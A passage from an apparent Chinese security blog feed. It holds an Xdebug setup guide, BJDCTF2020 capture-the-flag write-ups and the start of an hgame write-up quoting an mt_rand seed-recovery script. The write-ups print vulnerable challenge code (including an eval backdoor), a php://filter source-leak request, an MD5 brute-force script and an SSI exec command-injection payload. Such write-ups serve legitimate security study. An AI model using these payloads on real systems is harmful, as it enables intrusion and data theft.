class="line">zend_extension=/Users/xianyu123/.phpbrew/php/php-5.6.40/lib/php/extensions/no-debug-non-zts-20131226/xdebug.so</span><br></pre></td></tr></table></figure><p>然后我们重启一下<code>php-fpm</code>，然后创建一个文件，内容如下，在网页端打开</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br></pre></td></tr></table></figure><p>如果出现如下，则说明php端已经配置成功了</p><p><img src="http://images.xianyu123.club/xdebug1.png" alt></p><h2 id="3-配置phpstorm调试功能"><a href="#3-配置phpstorm调试功能" class="headerlink" title="3. 配置phpstorm调试功能"></a>3. 配置phpstorm调试功能</h2><p>先把下面的配置添加到<code>php.ini</code>中，然后重启php-fpm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_enable = 1</span><br><span class="line">xdebug.remote_handler = dbgp</span><br><span class="line">xdebug.remote_host = 127.0.0.1</span><br><span class="line">xdebug.remote_port = 9001</span><br><span class="line">xdebug.idekey = PHPSTORM</span><br></pre></td></tr></table></figure><p>然后在phpstorm的菜单栏<code>Preferences</code>中找到<code>Debug</code>，填写端口为<code>9001</code></p><p><img src="http://images.xianyu123.club/xdebug3.png" alt></p><p>然后填写</p><p>IDE key：刚才写入<code>php.ini)</code>中</p><p>host：127.0.0.1</p><p>port：项目运行端口，我是用82端口搭建的，有些师傅可能是80</p><p><img src="http://images.xianyu123.club/xdebug4.png" alt></p><p>然后在servers中配置信息</p><p>Name：随便取</p><p>Host：127.0.0.1</p><p>Port：按照你的项目运行端口</p><p>Debugger：按照下图的</p><p><img src="http://images.xianyu123.club/20200522195638.png" alt="image-20200211155643870"></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>打好断点，然后点击这个绿色的小虫子</p><p><img src="http://images.xianyu123.club/xdebug5.png" alt></p><p>按这个一步一步调试</p><p><img src="http://images.xianyu123.club/xdebug6.png" alt></p><p>出现这样说明配置成功了</p><p><img src="http://images.xianyu123.club/xdebug7.png" alt></p><h2 id="4-chrome调试配置"><a href="#4-chrome调试配置" class="headerlink" title="4. chrome调试配置"></a>4. chrome调试配置</h2><p>先下载扩展</p><p>右键扩展选项，在IDE key中选择phpstorm，然后保存，这里名字不能被修改，只能用<code>PHPSTORM</code></p><p><img src="http://images.xianyu123.club/xdebug8.png" alt></p><p>然后在网页打开php，选择debug</p><p><img src="http://images.xianyu123.club/xdebug9.png" alt></p><p>并且在phpstorm中开启这个电话按钮，变成绿色</p><p><img src="http://images.xianyu123.club/xdebug11.png" alt></p><p>然后在phpstorm中就有弹窗，选择同意，这样就可以快乐的调试了</p><p><img src="http://images.xianyu123.club/xdebug10.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;mac+phpstorm+php5.6+chrome+xdebug配置&lt;/p&gt;
    
    </summary>
    
      <category term="mac" scheme="http://0clickjacking0.github.io/categories/mac/"/>
    
    
  </entry>
  
  <entry>
    <title>BJDCTF2020复现</title>
    <link href="http://0clickjacking0.github.io/2020/02/08/BJDCTF2020%E5%A4%8D%E7%8E%B0/"/>
    <id>http://0clickjacking0.github.io/2020/02/08/BJDCTF2020复现/</id>
    <published>2020-02-08T04:59:43.000Z</published>
    <updated>2020-02-09T01:50:11.147Z</updated>
    
    <content type="html"><![CDATA[<p>由于不是本校学生，所以我在<a href="https://buuoj.cn/challenge" target="_blank" rel="noopener">buuctf</a>复现了一波</p><a id="more"></a><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p><code>.git</code>源码泄漏，用工具<code>Git_Extract</code>得到<code>index.php</code>的核心代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;%</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先使用<code>php://input</code>输入流和<code>php://filter</code>过滤器进行读取</p><p>请求包</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?text=php://input&amp;file=php://filter/convert.base64-encode/resource=next.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 79240f88-1651-412e-a5ae-f80e1d0c144c.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 14</span><br><span class="line"></span><br><span class="line">I have a dream</span><br></pre></td></tr></table></figure><p>返回包</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: openresty</span><br><span class="line"><span class="attribute">Date</span>: Sat, 08 Feb 2020 04:56:41 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 432</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">X-Powered-By</span>: PHP/5.6.40</span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;h1&gt;I have a dream&lt;/h1&gt;&lt;/br&gt;PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K</span><br></pre></td></tr></table></figure><p>base64解码后得到<code>next.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里第8行，<code>preg_replace</code>函数开启了<code>e</code>模式，根据php官网对e模式的描述如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果设置了这个被弃用的修饰符， preg_replace() 在进行了对替换字符串的 后向引用替换之后, 将替换后的字符串作为php 代码评估执行(eval 函数方式)，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线(\)和 NULL 字符在 后向引用替换时会被用反斜线转义.</span><br></pre></td></tr></table></figure><p>虽然第二个参数没有可控的地方</p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>扫描后发现存在<code>index.php.swp</code>，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">function get_hash()&#123;</span><br><span class="line">$chars = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&apos;;</span><br><span class="line">$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times</span><br><span class="line">$content = uniqid().$random;</span><br><span class="line">return sha1($content); </span><br><span class="line">&#125;</span><br><span class="line">    header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">***</span><br><span class="line">    if(isset($_POST[&apos;username&apos;]) and $_POST[&apos;username&apos;] != &apos;&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = &apos;6d0bc1&apos;;</span><br><span class="line">        if ( $admin == substr(md5($_POST[&apos;password&apos;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;[+] Welcome to manage system&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text = &apos;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&apos;.$_POST[&apos;username&apos;].&apos;&lt;/h1&gt;</span><br><span class="line">            ***</span><br><span class="line">***&apos;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">echo &quot;[!] Header  error ...&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;[!] Failed&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">            </span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>比较简单的ssi注入漏洞，没有任何过滤，直接打就好了，具体可以参考我的这篇文章<a href="https://0clickjacking0.github.io/2019/09/13/ssi漏洞小结/">ssi漏洞小结</a></p><p>爆破md5的脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">list = string.digits+string.ascii_letters</span><br><span class="line">input_md5 = input(<span class="string">'请输入md5值：'</span>)</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> list:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> list:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> list:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> list:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> list:<span class="comment">#5位数</span></span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> list:  <span class="comment"># 6位数</span></span><br><span class="line">                        <span class="keyword">for</span> g <span class="keyword">in</span> list:  <span class="comment"># 7位数</span></span><br><span class="line">                            str4=(a+b+c+d+e+f+g)</span><br><span class="line">                            value = hashlib.md5(str4.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">                            value1 = value.hexdigest()</span><br><span class="line">                            <span class="comment">#print (value1)</span></span><br><span class="line">                            s4 = value1[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">                            <span class="comment"># print (s1)</span></span><br><span class="line">                            <span class="keyword">if</span> s4 == input_md5:<span class="comment">#写入从页面中获取6位数</span></span><br><span class="line">                                <span class="keyword">print</span> (str4)</span><br></pre></td></tr></table></figure><p>Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2 &quot;--&gt;&amp;password=000e6wc</span><br></pre></td></tr></table></figure><p>然后访问返回头<code>Url_is_here</code>返回的链接即可得到flag</p><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由于不是本校学生，所以我在&lt;a href=&quot;https://buuoj.cn/challenge&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;复现了一波&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0clickjacking0.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>hgame2020-Level-Week3_Web_writeup</title>
    <link href="http://0clickjacking0.github.io/2020/02/04/hgame2020-Level-Week3-Web-writeup/"/>
    <id>http://0clickjacking0.github.io/2020/02/04/hgame2020-Level-Week3-Web-writeup/</id>
    <published>2020-02-04T04:28:22.000Z</published>
    <updated>2020-02-28T12:21:42.474Z</updated>
    
    <content type="html"><![CDATA[<p>hgame2020-Level-Week3_Web_writeup</p><a id="more"></a><h2 id="二发入魂！"><a href="#二发入魂！" class="headerlink" title="二发入魂！"></a>二发入魂！</h2><p>这里具体可以看这篇文章，<a href="https://www.ambionics.io/blog/php-mt-rand-prediction" target="_blank" rel="noopener">BREAKING PHP’S MT_RAND() WITH 2 VALUES AND NO BRUTEFORCE</a>，原理很不错，值得研究。</p><p>把下面两个文件放在同一目录下</p><p><code>reverse_mt_rand.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3.6</span></span><br><span class="line"><span class="comment"># Charles Fol</span></span><br><span class="line"><span class="comment"># @cfreal_</span></span><br><span class="line"><span class="comment"># 2020-01-04 (originally la long time ago ~ 2010)</span></span><br><span class="line"><span class="comment"># Breaking mt_rand() with two output values and no bruteforce.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">R = final rand value</span></span><br><span class="line"><span class="string">S = merged state value</span></span><br><span class="line"><span class="string">s = original state value</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">N = <span class="number">624</span></span><br><span class="line">M = <span class="number">397</span></span><br><span class="line"></span><br><span class="line">MAX = <span class="number">0xffffffff</span></span><br><span class="line">MOD = MAX + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># STATE_MULT * STATE_MULT_INV = 1 (mod MOD)</span></span><br><span class="line">STATE_MULT = <span class="number">1812433253</span></span><br><span class="line">STATE_MULT_INV = <span class="number">2520285293</span></span><br><span class="line"></span><br><span class="line">MT_RAND_MT19937 = <span class="number">1</span></span><br><span class="line">MT_RAND_PHP = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_initialize</span><span class="params">(seed)</span>:</span></span><br><span class="line">    <span class="string">"""Creates the initial state array from a seed.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    state = [<span class="keyword">None</span>] * N</span><br><span class="line">    state[<span class="number">0</span>] = seed &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N):</span><br><span class="line">        r = state[i - <span class="number">1</span>]</span><br><span class="line">        state[i] = (STATE_MULT * (r ^ (r &gt;&gt; <span class="number">30</span>)) + i) &amp; MAX</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_initialize</span><span class="params">(s, p)</span>:</span></span><br><span class="line">    <span class="string">"""From an initial state value `s` at position `p`, find out seed.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment"># We have:</span></span><br><span class="line">    <span class="comment"># state[i] = (1812433253U * ( state[i-1] ^ (state[i-1] &gt;&gt; 30) + i )) % 100000000</span></span><br><span class="line">    <span class="comment"># and:</span></span><br><span class="line">    <span class="comment"># (2520285293 * 1812433253) % 100000000 = 1 (Modular mult. inverse)</span></span><br><span class="line">    <span class="comment"># =&gt; 2520285293 * (state[i] - i) = ( state[i-1] ^ (state[i-1] &gt;&gt; 30) ) (mod 100000000)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(p, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">        s = _undo_php_mt_initialize(s, i)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_undo_php_mt_initialize</span><span class="params">(s, i)</span>:</span></span><br><span class="line">    s = (STATE_MULT_INV * (s - i)) &amp; MAX</span><br><span class="line">    <span class="keyword">return</span> s ^ s &gt;&gt; <span class="number">30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_rand</span><span class="params">(s1)</span>:</span></span><br><span class="line">    <span class="string">"""Converts a merged state value `s1` into a random value, then sent to the</span></span><br><span class="line"><span class="string">    user.</span></span><br><span class="line"><span class="string">    